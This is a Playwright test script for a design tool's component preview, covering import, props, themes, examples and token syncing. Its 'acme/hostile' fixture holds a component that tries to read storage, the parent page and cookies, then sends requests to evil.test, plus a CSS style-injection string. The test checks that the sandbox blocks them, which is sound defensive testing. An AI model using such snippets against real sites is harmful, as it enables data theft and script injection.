const { chromium } = require("playwright");
const crypto = require("crypto");
const fs = require("fs");
const path = require("path");
const { seed } = require("./support/seed");
const { tokensLinked } = require("./support/git-panel");
const { serve } = require("./support/fake-cdn");

const { OUT } = require("./support/env");
const { FIXTURE } = require("./support/env");
const blobSha = (text) => {
  const body = Buffer.from(text, "utf8");
  return crypto.createHash("sha1").update(`blob ${body.length}\0`).update(body).digest("hex");
};
function loadDir(dir, prefix = "") {
  const files = {};
  for (const e of fs.readdirSync(dir, { withFileTypes: true })) {
    if (e.isDirectory()) Object.assign(files, loadDir(path.join(dir, e.name), `${prefix}${e.name}/`));
    else files[`${prefix}${e.name.replace(/\.fixture$/, "")}`] = fs.readFileSync(path.join(dir, e.name), "utf8");
  }
  return files;
}

// ── Repositories served by the fake GitHub ───────────────────────────────────
const pkg = (extra = {}) => JSON.stringify({ name: "x", dependencies: { react: "^19.0.0", "react-dom": "^19.0.0", ...extra } });
const repos = {
  "acme/ds": { main: new Map(Object.entries(loadDir(FIXTURE))) },
  // Styled with CSS modules: not previewable yet, and it should say so.
  "acme/modules": { main: new Map(Object.entries({
    "package.json": pkg(),
    "src/index.ts": 'export { Card } from "./Card";',
    "src/Card.tsx": 'import styles from "./Card.module.css";\nexport function Card() { return <div className={styles.card}>Card</div>; }',
    "src/Card.module.css": ".card { padding: 8px; }",
  })) },
  // Tries to reach out of the sandbox.
  "acme/hostile": { main: new Map(Object.entries({
    "package.json": pkg({ tailwindcss: "^4.0.0" }),
    "src/index.ts": 'export { Spy } from "./Spy";',
    "src/styles.css": '@import "tailwindcss";\n.spy::after { content: "</style><script>window.__xss=1</script>"; }',
    "src/Spy.tsx": `
      export function Spy() {
        const out: string[] = [];
        try { out.push("storage:" + String(window.localStorage.getItem("motif-git"))); } catch (e) { out.push("storage blocked"); }
        try { out.push("parent:" + String(window.parent.document.title)); } catch (e) { out.push("parent blocked"); }
        try { out.push("cookie:" + document.cookie); } catch (e) { out.push("cookie blocked"); }
        fetch("https://evil.test/steal").catch(() => {});
        const img = new Image(); img.src = "https://evil.test/pixel.png?c=1";
        return <pre className="spy">{out.join(" | ")}</pre>;
      }`,
  })) },
};
const requests = [];

async function github(route) {
  const req = route.request();
  const url = new URL(req.url());
  const cors = { "access-control-allow-origin": "*", "access-control-allow-headers": "*", "access-control-allow-methods": "*" };
  const json = (status, body) => route.fulfill({ status, headers: cors, contentType: "application/json", body: JSON.stringify(body) });
  if (req.method() === "OPTIONS") return route.fulfill({ status: 204, headers: cors });
  const m = url.pathname.match(/^\/repos\/([^/]+\/[^/]+)(\/.*)?$/);
  const branches = m && repos[m[1]];
  if (!branches) return json(404, { message: "Not Found" });
  const token = (req.headers()["authorization"] ?? "").replace("Bearer ", "");
  if (token && token !== "t") return json(401, { message: "Bad credentials" });
  const rest = decodeURIComponent(m[2] ?? "");
  if (rest === "") return json(200, { default_branch: "main", permissions: { push: Boolean(token) } });
  if (rest === "/branches") return json(200, Object.keys(branches).map((name) => ({ name })));
  // A branch whose files changed is a new commit: what the app has read for a commit is kept.
  const version = (name) => [...(branches[name]?.values() ?? [])].reduce((n, t) => n + t.length, branches[name]?.size ?? 0);
  if (rest.startsWith("/git/ref/heads/")) return json(200, { object: { sha: `commit:${rest.slice(15)}@${version(rest.slice(15))}` } });
  if (rest.startsWith("/git/trees/")) {
    const b = rest.slice(11).split("?")[0].replace("commit:", "").split("@")[0];
    return json(200, { truncated: false, tree: [...branches[b].keys()].map((p) => ({ path: p, type: "blob" })) });
  }
  if (rest.startsWith("/contents/")) {
    const text = branches[url.searchParams.get("ref")]?.get(rest.slice(10));
    return text === undefined ? json(404, { message: "Not Found" }) : json(200, { sha: blobSha(text), content: Buffer.from(text).toString("base64"), encoding: "base64" });
  }
  return json(404, { message: "Not Found" });
}

const checks = [];
const check = (name, ok, detail = "") => {
  checks.push({ name, ok });
  console.log(`${ok ? "PASS" : "FAIL"}  ${name}${detail ? "  — " + String(detail).slice(0, 300) : ""}`);
};

(async () => {
  const browser = await chromium.launch();
  const context = await browser.newContext({ viewport: { width: 1440, height: 900 }, deviceScaleFactor: 2 });
  const page = await context.newPage();
  const errors = [];
  page.on("pageerror", (e) => errors.push(e.message));
  page.on("console", (m) => { if (m.type() === "error" && !/Failed to load resource|evil\.test|Content Security Policy|violates/i.test(m.text())) errors.push(m.text()); });
  await context.route("https://api.github.com/**", github);
  await context.route(/^https:\/\/(esm\.sh|cdn\.jsdelivr\.net)\//, async (route) => {
    const out = await serve(route.request().url());
    if (!out) return route.abort();
    route.fulfill({ status: out.status, contentType: out.type, headers: { "access-control-allow-origin": "*" }, body: out.body });
  });
  await context.route(/^https:\/\/evil\.test\//, (route) => { requests.push(route.request().url()); route.abort(); });

    let projectCount = 0;

  const nav = async (title) => { await page.locator(`nav button[title="${title}"]`).click(); await page.waitForLoadState("networkidle").catch(() => {}); await page.waitForTimeout(250); };
  const stage = page.frameLocator('iframe[title="Component preview"]');
  const aside = page.locator("aside").last();
  const repoSection = page.locator("div.border-b", { has: page.getByText("Repository", { exact: true }) }).first();
  const rowFor = (name) => page.locator("aside button[title*='src/']").filter({ hasText: new RegExp(`^${name}$`) });
  const openRepoComponent = async (name) => { await rowFor(name).click(); await page.getByText(name, { exact: true }).first().waitFor(); };

  // ── Connect, scan, import ─────────────────────────────────────────────────
  const gitOpen = async () => await page.getByText("Components and tokens").isVisible();
  const openGit = async () => { if (!(await gitOpen())) await nav("Git"); };
  const closeGit = async () => { if (await gitOpen()) await nav("Git"); };
  async function connectAndImport(repo) {
    const id = "prev000" + ++projectCount;
    await seed(page, id, { repo });
    await page.goto("http://localhost:3000/editor/" + id);
    await page.getByText("Layers", { exact: true }).waitFor();
    await nav("Git");
    await page.getByRole("button", { name: "Scan" }).click();
    await page.getByText(/tokens · \d+ components/).waitFor({ timeout: 30000 });
    await page.getByRole("button", { name: /(Re-import|Import) components/ }).click();
    await page.getByText(/Imported \d+ components/).waitFor();
  }
  await connectAndImport("acme/ds");
  check("importing reports how many components were brought in", await page.getByText("Imported 22 components.").isVisible());
  await closeGit();
  await nav("Components");
  await page.getByText("Layers", { exact: true }).waitFor();
  check("the components appear in a Repository group", (await page.locator("aside button[title*='src/components/']").count()) === 22);
  await page.screenshot({ path: `${OUT}/preview-list.png` });

  // ── Button: the real component, with the repository's real styles ─────────
  await openRepoComponent("Button");
  await stage.locator("button").first().waitFor({ timeout: 60000 });
  check("the stage replaces the canvas and says what it shows", (await page.getByText("src/components/Button.tsx:", { exact: false }).first().isVisible()) && (await page.locator("canvas").count()) === 0);
  const style = async (selector = "button") => stage.locator(selector).first().evaluate((el) => ({ bg: getComputedStyle(el).backgroundColor, color: getComputedStyle(el).color, radius: getComputedStyle(el).borderRadius, font: getComputedStyle(el).fontFamily, text: el.textContent }));
  let s = await style();
  check("it renders with the repository's own tokens and fonts", s.bg === "oklch(0.52 0.21 270)" && s.radius === "8px" && s.font.startsWith("Inter") && s.text === "Button", JSON.stringify(s));
  check("the iframe is sandboxed without access to Motif", (await page.locator('iframe[title="Component preview"]').getAttribute("sandbox")) === "allow-scripts");
  await page.screenshot({ path: `${OUT}/preview-button.png` });

  // ── Props change the component ────────────────────────────────────────────
  // (Opening a component lands in Design; its props are the Preview mode's panel.)
  await page.getByRole("button", { name: "Preview", exact: true }).click();
  await aside.getByLabel("variant").selectOption("danger");
  await page.waitForTimeout(600);
  s = await style();
  check("choosing a variant re-renders with that variant's styles", s.bg === "oklch(0.56 0.21 25)", s.bg);
  await aside.getByLabel("children").fill("Delete");
  await page.waitForTimeout(400);
  check("editing text changes what the component shows", (await style()).text === "Delete");
  await aside.getByLabel("loading").selectOption("true");
  await page.waitForTimeout(400);
  check("a boolean prop turns on the loading spinner", (await stage.locator("button span[aria-hidden]").count()) === 1);
  await aside.getByRole("button", { name: /Reset/ }).click();
  await page.waitForTimeout(500);
  s = await style();
  check("reset returns to the starting values", s.bg === "oklch(0.52 0.21 270)" && s.text === "Button");

  // ── Theme and width ───────────────────────────────────────────────────────
  await page.getByRole("button", { name: "Dark theme" }).click();
  await page.waitForTimeout(600);
  check("the dark theme uses the repository's own dark mode", (await stage.locator("html").getAttribute("class")) === "dark" && (await style()).bg === "oklch(0.65 0.18 270)");
  await page.screenshot({ path: `${OUT}/preview-dark.png` });
  await page.getByRole("button", { name: "Light theme" }).click();
  await page.getByRole("button", { name: "Preview width: 375" }).click();
  check("the width control resizes the preview", (await stage.locator("html").evaluate(() => innerWidth)) === 375);
  await page.getByRole("button", { name: "Preview width: Auto" }).click();

  // ── All variants ──────────────────────────────────────────────────────────
  await page.getByRole("button", { name: "Variants", exact: true }).click();
  await page.waitForTimeout(1200);
  check("all variants shows every combination, labelled", (await stage.locator("button").count()) === 20 && (await stage.getByText("danger · icon", { exact: true }).count()) === 1);
  await page.screenshot({ path: `${OUT}/preview-variants.png` });
  await page.getByRole("button", { name: "Preview", exact: true }).click();

  // ── Every component in the design system renders without an error ────────
  const names = ["Alert", "Avatar", "Badge", "Button", "Card", "CardContent", "CardDescription", "CardFooter", "CardHeader", "CardTitle", "Checkbox", "Field", "Input", "Label", "Modal", "Select", "Switch", "Tabs", "TabsContent", "TabsList", "TabsTrigger", "Textarea"];
  const failures = [];
  for (const name of names) {
    await rowFor(name).click();
    await page.waitForTimeout(900);
    await stage.locator("#root > div").first().waitFor({ timeout: 30000 }).catch(() => {});
    const problem = await stage.locator("#root pre").count();
    const banner = await page.locator("p.font-mono.text-red-400").count();
    const empty = (await stage.locator("#root").evaluate((el) => el.textContent?.length ?? 0)) + (await stage.locator("#root *").count()) === 0;
    if (problem || banner || empty) failures.push(`${name}${problem ? " (error shown: " + (await stage.locator("#root pre").first().innerText()).slice(0, 80) + ")" : ""}`);
  }
  // Tabs parts need a Tabs parent; the examples that provide one come with the next phase.
  const real22 = failures.filter((f) => !/^Tabs(Content|Trigger) .*must be used inside <Tabs>/.test(f));
  check("all 22 components render without an error (Tabs parts need their parent)", real22.length === 0, real22.join("; "));
  await rowFor("Modal").click(); await page.waitForTimeout(900);
  check("Modal opens with its required props filled in", (await stage.locator("dialog[open]").count()) === 1 && (await stage.locator("dialog h2").innerText()) === "Title");
  await rowFor("Avatar").click(); await page.waitForTimeout(900);
  check("Avatar shows its initials from a sample name", (await stage.locator('[role="img"]').innerText()) === "AL");
  await page.screenshot({ path: `${OUT}/preview-avatar.png` });


  // ── Examples from the repository's own demo ───────────────────────────────
  const examplesButton = page.getByRole("button", { name: /^Examples/ });
  const openExamples = async (name) => {
    await rowFor(name).click();
    for (let i = 0; i < 60 && (await examplesButton.isDisabled().catch(() => true)); i++) await page.waitForTimeout(500);
    await examplesButton.click();
  };
  await openExamples("Tabs");
  await stage.locator('[role="tablist"]').waitFor({ timeout: 60000 });
  check("Tabs shows the demo's tabs, with their parent", (await stage.locator('[role="tab"]').allInnerTexts()).join() === "Overview,Activity,Settings");
  await stage.locator('[role="tab"]', { hasText: "Activity" }).click();
  check("and they work: choosing a tab shows its panel", await stage.getByText("Recent activity feed.").isVisible());
  check("the example is labelled with where it came from", await stage.getByText(/Tabs · defaultValue: overview\s+·\s+demo\/App\.tsx:\d+/).isVisible());

  await openExamples("TabsTrigger");
  await stage.locator('[role="tablist"]').waitFor({ timeout: 60000 });
  check("a part that can't stand alone is shown inside its parent", (await stage.locator("#root pre").count()) === 0 && (await stage.locator('[role="tab"]').count()) === 3);

  await openExamples("Card");
  await stage.getByRole("heading", { name: "Create account" }).waitFor({ timeout: 60000 });
  const email = stage.locator('input[type="email"]');
  await email.fill("ada@example.com");
  check("a form from the demo renders and takes input, without the demo's state", (await email.inputValue()) === "ada@example.com" && (await stage.getByText("Email").count()) > 0 && (await stage.locator("#root pre").count()) === 0);
  check("what was left out is said, under the preview", await page.getByText(/as shown here, .*comes from the demo's state/).first().isVisible());
  await page.screenshot({ path: `${OUT}/examples-card.png` });

  await openExamples("Modal");
  await stage.locator("dialog[open]").waitFor({ timeout: 60000 });
  check("an overlay that the demo opened with state is shown open", (await stage.locator("dialog h2").innerText()) === "Delete project?" && (await stage.locator("dialog button").count()) >= 2);

  await openExamples("Button");
  await stage.getByText("Button · variant: danger").waitFor({ timeout: 60000 });
  check("every usage of a simple component becomes an example, capped", (await stage.locator("#root button").count()) === 8);
  await page.screenshot({ path: `${OUT}/examples-button.png` });

  // ── Back to the overview ──────────────────────────────────────────────────
  await rowFor("Button").click();
  await page.waitForTimeout(600);
  check("closing the open component returns to the list of components", (await page.locator("iframe[title='Component preview']").count()) === 0 && await page.getByText("Choose a component").isVisible());
  await page.screenshot({ path: `${OUT}/overview.png` });
  await page.getByRole("button", { name: /^Alert/ }).first().click();
  check("and a card on it opens that component", await stage.locator("#root [role]").first().waitFor({ timeout: 60000 }).then(() => true, () => false));

  // ── Update from the repository ────────────────────────────────────────────
  repos["acme/ds"].main.set("src/components/Chip.tsx", 'import { cn } from "../lib/cn";\nexport interface ChipProps { tone?: "a" | "b"; }\nexport function Chip({ tone = "a" }: ChipProps) { return <i className={cn("p-1", tone === "a" && "bg-primary")}>x</i>; }');
  repos["acme/ds"].main.set("src/index.ts", repos["acme/ds"].main.get("src/index.ts") + '\nexport { Chip } from "./components/Chip";');
  repos["acme/ds"].main.set("src/components/Badge.tsx", repos["acme/ds"].main.get("src/components/Badge.tsx").replace("outline: \"border border-border text-foreground\",", 'outline: "border border-border text-foreground",\n        ghost: "bg-transparent",'));
  await page.getByRole("button", { name: "Update from repository" }).click();
  await page.getByText("1 new, 1 changed").waitFor({ timeout: 30000 });
  check("updating from the repository reports what is new and what changed", (await page.locator("aside button[title*='src/components/']").count()) === 23);
  await openRepoComponent("Chip");
  await stage.locator("i").first().waitFor({ timeout: 60000 });
  check("a component added in the repository previews straight away", (await stage.locator("i").first().innerText()) === "x");


  // ── Motif's own token changes show up in the previews ─────────────────────
  const dialog = page.getByRole("dialog");
  await openGit();
  await tokensLinked(page);
  await closeGit();
  await nav("Components");
  await openRepoComponent("Button");
  await page.getByRole("button", { name: "Preview", exact: true }).click();
  await stage.locator("#root button").waitFor({ timeout: 60000 });
  const bgOf = () => stage.locator("#root button").first().evaluate((el) => getComputedStyle(el).backgroundColor);
  check("with nothing changed in Motif, previews show the repository's own tokens", (await bgOf()).startsWith("oklch(0.52") && (await page.getByLabel("Motif token changes").count()) === 0);

  await page.waitForTimeout(1500);
  await page.evaluate(() => {
    const raw = JSON.parse(localStorage.getItem("motif-projects"));
    const state = raw.state.projects[0].tokens;
    const set = state.sets.find((x) => x.name === "acme/ds");
    const light = set.themes.find((t) => t.name === "Light").id;
    const c = state.colors.find((x) => x.setId === set.id && x.name === "primary");
    c.themeValues[light] = "#ff0000";
    c.value = "#ff0000";
    localStorage.setItem("motif-projects", JSON.stringify(raw));
  });
  await page.reload();
  await page.getByText("Layers", { exact: true }).waitFor();
  await page.waitForTimeout(800);
  if (!(await rowFor("Button").isVisible())) await nav("Components");
  await openRepoComponent("Button");
  await page.getByRole("button", { name: "Preview", exact: true }).click();
  await stage.locator("#root button").waitFor({ timeout: 60000 });
  await page.getByLabel("Motif token changes").waitFor();
  await page.waitForTimeout(500);
  check("a token changed in Motif restyles the repository's component", (await bgOf()) === "rgb(255, 0, 0)", await bgOf());
  check("and the toolbar says how many tokens differ", (await page.getByLabel("Motif token changes").innerText()).trim() === "1");
  await page.screenshot({ path: `${OUT}/preview-motif-tokens.png` });
  await page.getByLabel("Motif token changes").click();
  await page.waitForTimeout(400);
  check("it can be switched off to see the repository as it is", (await bgOf()).startsWith("oklch(0.52"));
  await page.getByLabel("Motif token changes").click();
  await page.waitForTimeout(400);
  check("and back on", (await bgOf()) === "rgb(255, 0, 0)");
  await page.getByRole("button", { name: "Dark theme" }).click();
  await page.waitForTimeout(500);
  check("the dark theme is not touched by a light-theme change", (await bgOf()).startsWith("oklch(0.65"), await bgOf());
  await page.getByRole("button", { name: "Light theme" }).click();

  // ── Not supported yet: says so ────────────────────────────────────────────
  await connectAndImport("acme/modules");
  await closeGit();
  await nav("Components");
  await openRepoComponent("Card");
  await page.getByText("This component can't be previewed yet").waitFor({ timeout: 30000 });
  check("a CSS-modules component explains why it can't be previewed", await page.getByText("CSS modules can't be previewed yet").isVisible());

  // ── Hostile code stays in the sandbox ─────────────────────────────────────
  await connectAndImport("acme/hostile");
  await closeGit();
  await nav("Components");
  await openRepoComponent("Spy");
  await stage.locator("pre.spy").waitFor({ timeout: 20000 }).catch(async () => {
    console.log("DEBUG stage:", (await stage.locator("body").innerText().catch(() => "?")).slice(0, 300), "| page:", (await page.locator("main, body").first().innerText()).slice(0, 400));
    await page.screenshot({ path: "debug-hostile.png" });
  });
  const spy = await stage.locator("pre.spy").innerText();
  check("it cannot read Motif's storage, its page or cookies", spy === "storage blocked | parent blocked | cookie blocked", spy);
  await page.waitForTimeout(800);
  // Images from https are allowed (repositories use them), so a pixel request goes out; scripts and fetch do not.
  check("it cannot fetch or script out, and its CSS cannot inject script", requests.every((r) => r.includes("pixel.png")) && (await stage.locator("html").evaluate(() => window.__xss)) === undefined, requests.join(","));
  await page.waitForTimeout(1000);
  check("Motif's own storage and token are untouched", (await page.evaluate(() => JSON.parse(localStorage.getItem("motif-projects")).state.projects[0].repo.connection.token)) === "t");

  const real = errors.filter((e) => !/hydrat|Tabs components must be used inside/i.test(e));
  check("no page errors besides the existing theme hydration warning", real.length === 0, real.join(" | "));
  await browser.close();
  const failed = checks.filter((c) => !c.ok);
  console.log(`\n${checks.length - failed.length}/${checks.length} checks passed`);
  process.exit(failed.length ? 1 : 0);
})().catch((e) => { console.error(String(e).slice(0, 2500)); process.exit(1); });
